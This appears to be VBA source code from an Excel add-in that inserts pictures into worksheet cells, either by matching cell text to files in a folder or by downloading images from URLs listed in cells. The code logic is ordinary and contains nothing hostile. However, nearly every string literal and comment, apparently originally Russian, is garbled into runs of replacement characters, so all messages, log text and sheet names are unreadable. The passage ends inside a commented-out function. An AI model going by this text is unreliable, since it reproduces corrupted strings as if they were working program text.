        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & vbNewLine & _
               "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
               PICTURES_FOLDER$, vbCritical, "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    Dim coll As Collection, pi As New ProgressIndicator, pfolder$, PicProp As PictureProperties
    pfolder$ = PICTURES_FOLDER$

    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", , 3: pi.FP.SpinButton_log.Visible = False: DoEvents
    pi.StartNewAction 1, 3, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|: " & pfolder$
    Set coll = FilenamesCollection(pfolder$, "*"): DoEvents

    If coll.Count = 0 Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & PICTURES_FOLDER$
        pi.Hide
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Sub
    End If

    Dim n_err As Long, n_ok As Long, cell As Range, PicCell As Range
    Application.ScreenUpdating = False: DoEvents

    RowsCount& = ra.Cells.Count
    VerticalCellsCount& = Val(SETT.GetNumber("ComboBox_CELLScount"))

    If SETT.GetBoolean("CheckBox_MergeEqualCells", False) Or Get_Data Then
        pi.StartNewAction 3, 4, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ..."
        MergeEqualCells ra, pi
    End If

    If SETT.GetBoolean("CheckBox_AutoDeletePictures") Then
        pi.StartNewAction 3, 4, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| ..."

        If SETT.GetBoolean("CheckBox_MultiColumns") Then
            DeleteShapesFromSheet ra.Worksheet: DoEvents
        Else
            ShapesInRange(Columns(PICTURE_COLUMN)).Delete: DoEvents
        End If
        If Not SETT.GetBoolean("CheckBox_KeepRowsHeightAfterDeleting") Then ActiveSheet.UsedRange.EntireRow.AutoFit: DoEvents
    End If

    pi.StartNewAction 3, 4, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ..."

    Application.EnableCancelKey = xlDisabled
    aww = ActiveWindow.View
    dpb = ra.Worksheet.DisplayPageBreaks
    ActiveWindow.View = xlNormalView
    ra.Worksheet.DisplayPageBreaks = False: DoEvents

    pi.StartNewAction 4, 5, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."

    Dim fileindex&: ReDim FilenamesArray(ll To coll.Count, 1 To 3)
    For Each file In coll
        fileindex& = fileindex& + 1
        filename$ = Split(file, "\")(UBound(Split(file, "\")))
        FilenameNoExt$ = filename$
        If filename$ Like "*.*" Then FilenameNoExt$ = Left(filename$, InStrRev(filename$, ".") - 1)

        FilenamesArray(fileindex&, 1) = file
        FilenamesArray(fileindex&, 2) = filename$
        FilenamesArray(fileindex&, 3) = FilenameNoExt$
    Next
    Dim FindFirstImageOnly As Boolean: FindFirstImageOnly = Not SETT.GetBoolean("CheckBox_Add_ImagesCount", False)
    Dim MissingImagesList As New Collection

    pi_step& = 50: pi.StartNewAction 5, , "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|", , "$time", ra.Cells.Count: pi.SubActionsStep = pi_step&

    For Each cell In ra.Cells        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        counter& = counter& + 1: DoEvents
        If Len(Trim(cell)) And cell.MergeArea.Cells(1).Address = cell.Address Then
            Set PicProp = New PictureProperties

            picpath$ = GetPicturePathForCellNew(cell, FilenamesArray, PicProp, FindFirstImageOnly)

            If counter& Mod pi_step& = 0 Then pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & " |fffd||fffd| " & n_ok + n_err, "$time"        '& "   |fffd||fffd||fffd||fffd||fffd|: " & dt1 & " / " & dt2

            logtext$ = "|fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0, xlA1) & ", |fffd||fffd||fffd||fffd||fffd| |fffd|" & cell & "|fffd|" & vbNewLine

            If Len(picpath) > 0 Then
                logtext$ = logtext$ & "+  |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & PicProp.FilesCount & ", " & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & Replace(picpath, pfolder$, "")

                t1 = Timer
                PasteImageIntoRow cell, picpath$, PicProp
                it1 = it1 + 1: st1 = st1 + 1000 * (Timer - t1)
                dt1 = Format(st1 / it1, "0.00") & " ms"
                n_ok = n_ok + 1
            Else
                logtext$ = logtext$ & "-  |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                MissingImagesList.Add cell
                n_err = n_err + 1
            End If
            DoEvents

            t2 = Timer
            DoEvents
            If counter& Mod pi_step& = 0 Then pi.Log logtext$ & vbNewLine, 1000
            DoEvents
            it2 = it2 + 1: st2 = st2 + 1000 * (Timer - t2)
            dt2 = Format(st2 / it2, "0.00") & " ms"
        End If
        DoEvents
        If StopMacro Then Exit For
    Next cell

    pi.Log vbNewLine & vbNewLine
    pi.StartNewAction 100, 100, IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & " |fffd||fffd| " & n_ok + n_err & vbNewLine, " "

    msg = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:  " & vbNewLine & PICTURES_FOLDER$ & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & SEARCH_MODE_TXT & vbNewLine & vbNewLine

    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RowsCount& & " |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & ra.Address(0, 0) & "" & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & vbNewLine
    msg = msg & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_err

    pi.CancelButton.Width = 0: StopMacro = True
    pi.Log msg
    If n_ok = 0 Then
        pi.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ShowSettingsPage"
    ElseIf n_ok > 0 And n_err > 1 Then
        pi.AddButton "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "FindPicturesInInternet"
    End If
    Set VisiblePI = pi
    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then pi.Hide


    If SETT.GetBoolean("CheckBox_OutputMissingImagesList") Then
        Dim ash As Worksheet: Set ash = ActiveSheet
        Const MissingImagesSheetName$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd|"
        Application.DisplayAlerts = False
        ActiveWorkbook.Worksheets(MissingImagesSheetName$).Delete
        Application.DisplayAlerts = True

        If MissingImagesList.Count Then
            Dim shd As Worksheet
            Set shd = ActiveWorkbook.Worksheets.Add(, ActiveWorkbook.Worksheets(ActiveWorkbook.Worksheets.Count))
            shd.name = MissingImagesSheetName$
            shd.Tab.Color = vbRed

            With shd
                .Range("a1") = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": .Range("b1") = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                For Each cell In MissingImagesList
                    With .Range("a" & .Rows.Count).End(xlUp).Offset(1)
                        .Value = cell.Value
                        .Next.Hyperlinks.Add .Next, "", "'" & cell.Worksheet.name & "'!" & cell.Address(0, 0), _
                                             "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0), cell.Address(0, 0)
                    End With
                Next
            End With
            shd.UsedRange.EntireColumn.AutoFit
        End If
        ash.Activate
    End If

    Application.EnableCancelKey = xlInterrupt: DoEvents
    If ActiveWindow.View <> aww Then ActiveWindow.View = aww
    ra.Worksheet.DisplayPageBreaks = dpb

    Application.ScreenUpdating = True
End Sub

Function GetPicturePathForCellNew(ByVal cell As Range, ByRef FilesArr As Variant, _
                                  Optional ByRef PicProp As PictureProperties, Optional ByVal FindFirstImageOnly As Boolean) As String
    On Error Resume Next
    CellText$ = Trim(EvaluateFilenameUsingFormula(cell))
    If CellText$ = "" Then Exit Function

    If CellText$ Like "[A-z]:\?*.?*" Or CellText$ Like "\\?*\?*.?*" Then
        GetPicturePathForCellNew = CellText$
        Exit Function
    Else
        SMode = SEARCH_MODE
        If SMode <> SM_CellTextInFilename Then CellText$ = Replace_symbols(CellText$)

        For i = LBound(FilesArr) To UBound(FilesArr)
            txt = FilesArr(i, 1 + v_1)

            Select Case SMode
                Case SM_CellTextInFilename
                    If (FilesArr(i, 2) Like "*" & CellText$ & "*") Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCellNew = FilesArr(i, 1)
                        If FindFirstImageOnly Then GoTo endSearch
                    End If
                Case SM_FilenameInCellText
                    If (CellText$ Like "*" & FilesArr(i, 3) & "*") Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCellNew = FilesArr(i, 1)
                        If FindFirstImageOnly Then GoTo endSearch
                    End If
                Case SM_Equal
                    If (CellText$ = FilesArr(i, 3) Or CellText$ = FilesArr(i, 2)) Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCellNew = FilesArr(i, 1)
                        If FindFirstImageOnly Then GoTo endSearch
                    End If
            End Select
        Next i
endSearch:
        PicProp.SelectedFile = Split(GetPicturePathForCellNew, "\")(UBound(Split(GetPicturePathForCellNew, "\")))
    End If
End Function

Function GetPicturePathForCell(ByVal cell As Range, ByRef files As Collection, _
                               Optional ByRef PicProp As PictureProperties) As String
    On Error Resume Next
    CellText$ = Trim(EvaluateFilenameUsingFormula(cell))
    If CellText$ = "" Then Exit Function

    If CellText$ Like "[A-z]:\?*.?*" Or CellText$ Like "\\?*\?*.?*" Then
        GetPicturePathForCell = CellText$
        Exit Function
    Else
        CellText2$ = Replace_symbols(CellText$)
        SMode = SEARCH_MODE
        For Each file In files
            filename$ = Split(file, "\")(UBound(Split(file, "\")))
            FilenameNoExt$ = filename$
            If filename$ Like "*.*" Then FilenameNoExt$ = Left(filename$, InStrRev(filename$, ".") - 1)

            Select Case SMode
                Case SM_CellTextInFilename
                    If (filename$ Like "*" & CellText$ & "*") Or _
                       (filename$ Like "*" & CellText2$ & "*") Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCell = file
                    End If
                Case SM_FilenameInCellText
                    If (CellText$ Like "*" & FilenameNoExt$ & "*") Or _
                       (CellText2$ Like "*" & FilenameNoExt$ & "*") Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCell = file
                    End If
                Case SM_Equal
                    If (CellText$ = FilenameNoExt$ Or CellText$ = filename$) Or _
                       (CellText2$ = FilenameNoExt$ Or CellText2$ = filename$) Then
                        PicProp.FilesCount = PicProp.FilesCount + 1
                        GetPicturePathForCell = file
                    End If
            End Select
        Next
        PicProp.SelectedFile = Split(GetPicturePathForCell, "\")(UBound(Split(GetPicturePathForCell, "\")))
    End If
End Function

' ============================================================================================================
Attribute VB_Name = "mod_InsertFromLinks"
'---------------------------------------------------------------------------------------
' Module        : mod_InsertFromLinks
' |fffd||fffd||fffd||fffd||fffd|     : EducatedFool  (|fffd||fffd||fffd||fffd||fffd|)                    |fffd||fffd||fffd||fffd|: 05.10.2012
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: http://ExcelVBA.ru/payments
'---------------------------------------------------------------------------------------

Option Private Module
Option Compare Text

Sub InsertPicsFromLinks()
    On Error Resume Next
    Dim ra As Range: Set ra = GetSourceDataRange
    If ra Is Nothing Then Exit Sub

    If SETT.GetBoolean("CheckBox_UseCurrentFolder2") Then
        If ActiveWorkbook.Path = "" Then
            MsgBox tt("MSG_UseCurrentFolder_Error_UnsavedWB", tt("CONST_PD_FOLDER"), ActiveWorkbook.name), vbCritical, tt("FolderNotFound")
            ShowSettingsPage
            F_Settings.MultiPage_Options.Value = 1
            Exit Sub
        End If
    End If

    MkDir DOWNLOAD_FOLDER$
    Err.Clear
    If Dir(DOWNLOAD_FOLDER$, vbDirectory) = "" Then
        msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & DOWNLOAD_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        F_Settings.MultiPage_Options.Value = 1
        Exit Sub
    End If

    StopMacro = False
    Dim n_err As Long, n_ok As Long, cell As Range, PicCell As Range
    Application.ScreenUpdating = False

    RowsCount& = ra.Cells.Count
    ' picColumn& = PICTURE_COLUMN
    VerticalCellsCount& = Val(SETT.GetNumber("ComboBox_CELLScount"))

    Dim pi As New ProgressIndicator, pfolder$, PicProp As PictureProperties
    pi.Show "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , 3: pi.FP.SpinButton_log.Visible = False
    pi.StartNewAction , , , , "$time", ra.Cells.Count

    dfolder$ = DOWNLOAD_FOLDER$

    If SETT.GetBoolean("CheckBox_MergeEqualCells", False) Then MergeEqualCells ra, pi

    If SETT.GetBoolean("CheckBox_AutoDeletePictures") Then
        If SETT.GetBoolean("CheckBox_MultiColumns") Then
            DeleteShapesFromSheet ra.Worksheet
        Else
            ShapesInRange(Columns(PICTURE_COLUMN)).Delete
        End If

        ActiveSheet.UsedRange.EntireRow.AutoFit
    End If

    Application.EnableCancelKey = xlDisabled
    aww = ActiveWindow.View
    dpb = ra.Worksheet.DisplayPageBreaks
    ActiveWindow.View = ll    'xlNormalView
    ra.Worksheet.DisplayPageBreaks = False

    FilenameColumn& = Val(SETT.GetNumber("ComboBox_DownloadedFilenames_Column", 0))
    Dim RenameDownloadedFiles As Boolean: RenameDownloadedFiles = SETT.GetBoolean("CheckBox_RenameDownloadedPictures")


    For Each cell In ra.Cells        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        pi.SubAction "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| $index |fffd||fffd| $count", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & " |fffd||fffd| " & n_ok + n_err, "$time"
        URL$ = GetURL_FromCell(cell)
        ' Debug.Print URL$

        'picPath = GetURL_FromCell(cell)
        logtext$ = "|fffd||fffd||fffd||fffd||fffd||fffd| " & cell.Address(0, 0, xlA1) & ", |fffd||fffd||fffd||fffd||fffd||fffd| " & IIf(Len(URL$), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & vbNewLine & vbTab & URL$ & vbNewLine, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")

        If Len(URL$) Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If RenameDownloadedFiles * FilenameColumn& Then
                shortFilename$ = Trim(FWF.Replace_symbols(cell.EntireRow.Cells(FilenameColumn&)))
                If Not shortFilename$ Like "*.jpg" Then shortFilename$ = shortFilename$ & ".jpg"
            Else
                shortFilename$ = ConvertURLtoFilename(URL$)
            End If
            filename$ = dfolder$ & shortFilename$
            ' Debug.Print FileName$
            'Filename$ = dfolder$ & Replace(filename_template$, "addr", cell.Address(0, 0))

            If Dir(filename$, vbNormal) = shortFilename$ Then
                picpath$ = filename
                logtext$ = logtext$ & "+  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|: |fffd|" & Dir(filename) & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & FileOrFolderSize(FileLen(filename))

                PasteImageIntoRow cell, filename
                n_ok = n_ok + 1
            Else
                If DownLoadFileFromURL_New(URL$, filename) Then
                    picpath$ = filename
                    logtext$ = logtext$ & "+  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|: |fffd|" & Dir(filename) & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & FileOrFolderSize(FileLen(filename))

                    PasteImageIntoRow cell, filename
                    n_ok = n_ok + 1
                Else
                    logtext$ = logtext$ & "-  |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                    n_err = n_err + 1
                End If
            End If
        End If

        pi.Log logtext$ & vbNewLine, 2000
        DoEvents
        If StopMacro Then Exit For
    Next cell

    pi.Log vbNewLine & vbNewLine
    pi.StartNewAction 100, 100, IIf(StopMacro, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."), _
                      "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & " |fffd||fffd| " & ra.Cells.Count & vbNewLine, " "

    Dim ExactFilename As Boolean: ExactFilename = CBool(SETT.GetBoolean("CheckBox_ExactFilename", False))

    msg = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|:  " & vbNewLine & _
          DOWNLOAD_FOLDER$ & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & vbNewLine

    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & RowsCount& & " |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| " & ra.Address(0, 0) & "" & vbNewLine & vbNewLine
    msg = msg & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_ok & vbNewLine
    msg = msg & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:  " & n_err

    Application.EnableCancelKey = xlInterrupt
    If ActiveWindow.View <> aww Then ActiveWindow.View = aww
    ra.Worksheet.DisplayPageBreaks = dpb

    pi.CancelButton.Width = 0: StopMacro = True
    pi.Log msg & vbNewLine

    Set VisiblePI = pi
    If SETT.GetBoolean("CheckBox_CloseProgressBar") Then pi.Hide

    If n_ok > 0 Then pi.AddButton "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "OpenDownloadFolder"

    'ND "run macro", "Insert pictures from links " & IIf(StopMacro, "stopped", "done") & ", cells=" & RowsCount& & " (addr=" & ra.Address(0, 0) & "), pics=" & n_ok & ", errors=" & n_err & ", " & _
     "Dest: " & IIf(SETT.GetBoolean("CheckBox_Cells"), "cells", "") & IIf(SETT.GetBoolean("CheckBox_Cells") And SETT.GetBoolean("CheckBox_Comments"), "+", "") & IIf(SETT.GetBoolean("CheckBox_Comments"), "comments", "") & vbLf & CountersCurrentValues

    Application.ScreenUpdating = True
End Sub

Function DownLoadFileFromURL_New(ByVal URL$, ByVal LocalPath$) As Boolean
    On Error Resume Next: Kill LocalPath$

    shortFilename$ = Mid(LocalPath$, InStrRev(LocalPath$, "\") + 1)
    If shortFilename$ <> Replace_symbols(shortFilename$) Then
        Debug.Print "Wrong symbols in filename: " & shortFilename$
        Exit Function
    End If

    URL = RussianStringToURLEncode_New(URL)
    ' Debug.Print URL
    DownLoadFileFromURL_New = URLDownloadToFile(0, URL$, LocalPath$, 0, 0) = 0
End Function

'Function RussianStringToURLEncode_New(ByVal txt As String) As String
'    For i = 1 To Len(txt)
'        l = Mid(txt, i, 1)
'        Select Case AscW(l)
'            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
'            Case 32: t = "%20"
'            Case Else: t = l
'        End Select
'        RussianStringToURLEncode_New = RussianStringToURLEncode_New & t
